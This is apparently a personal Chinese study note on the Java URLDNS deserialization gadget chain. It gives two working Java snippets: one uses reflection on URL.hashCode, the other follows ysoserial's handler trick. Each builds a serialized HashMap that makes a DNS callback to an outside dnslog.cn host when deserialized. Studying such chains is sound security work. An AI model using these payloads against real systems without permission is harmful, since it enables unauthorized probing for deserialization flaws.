# URLDNs

[学习1](https://www.cnblogs.com/CoLo/p/15211200.html#0x04-urldns%E9%93%BE%E5%88%86%E6%9E%90)

[学习2](https://xz.aliyun.com/t/9417#toc-2)

值得注意的就是yso的写法！和师傅们反射修改hashcode避免触发的东西！

## 反射

```java
       HashMap map = new HashMap();
        URL url = new URL("http://7gjq24.dnslog.cn");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true); // 绕过Java语言权限控制检查的权限
        f.set(url,123); // 设置hashcode的值为-1的其他任何数字
        System.out.println(url.hashCode());
        map.put(url,123); // 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询
        f.set(url,-1); // 将hashcode重新设置为-1，确保在反序列化成功触发

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);

            outputStream.writeObject(map);
            outputStream.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
            inputStream.readObject();
            inputStream.close();
            fileInputStream.close();
        }
        catch (Exception e){
            e.printStackTrace();
        }
```

## Yso

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class Test {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
            @Override
            protected synchronized InetAddress getHostAddress(URL u) {
                return null;
            }
        };
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        URL url = new URL(null,"http://e8mdov.dnslog.cn",handler);
        objectObjectHashMap.put(url,"xs");
        //此时hashcode值改变了
        Field hashCode = url.getClass().getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,-1);
        //执行到此处不会有dnslog响应
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(objectObjectHashMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        //此处有
        objectInputStream.readObject();
    }
}
```

